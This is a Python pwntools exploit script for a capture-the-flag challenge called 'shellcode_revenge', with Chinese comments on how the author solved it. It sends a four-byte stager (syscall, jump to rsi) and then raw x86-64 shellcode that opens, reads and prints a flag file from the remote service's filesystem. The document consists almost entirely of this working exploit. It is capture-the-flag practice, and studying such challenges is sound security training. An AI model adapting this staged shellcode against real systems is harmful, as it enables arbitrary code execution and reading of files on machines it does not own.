#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import time
import sys
host="ctf.adl.csie.ncu.edu.tw"
port="11004"

#host = "127.0.0.1"
#port = "9000"

r=remote(host,port)

#ba 0a 00 00 00
#e8 78 fe ff ff
#shellcode = '\xe8\x72\xf4\xdf\xff\xc3\x00\x00\xe8'
shellcode1 = '\x0f\x05\xff\xe6'
shellcode2 = '\xeb\x3b\x5f\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xc0\xff\xff\xff/home/shellcode_revenge/flag\x00' 
#hi = '0x1111'
#hi = int(hi,16)
#print p64(hi)
#print (goal)
#print (hex(goal))
#print p64(goal)
#print(hex(u64(p64(goal))))
#p64可以把一個64進位的位址值打包成\x形式的string
print(r.recvuntil(")"))
r.sendline(shellcode1)
time.sleep(1)
r.sendline(shellcode2)
#r.sendline(shellcode2)
#print ('payload',payload)
#print len(payload)
#r.sendline(payload)
#0x7fffffffe388 >> return位址
#file = open('in2', 'w')
#file.write(payload)
#file.close()
r.interactive()



#乾這題搞超久的(一天半＠！？)，結果發現它rax很好心的幫我歸零，預設定的buf的位址剛好可讀可寫執行，
#所以直接syscall寫在他給的buf上，然後jump rsi，剩下的shellcode跟原本一模一樣
#跟我原本想做的事一樣，不過我光是call read就花了5個byte，直接ＧＧＧＧ
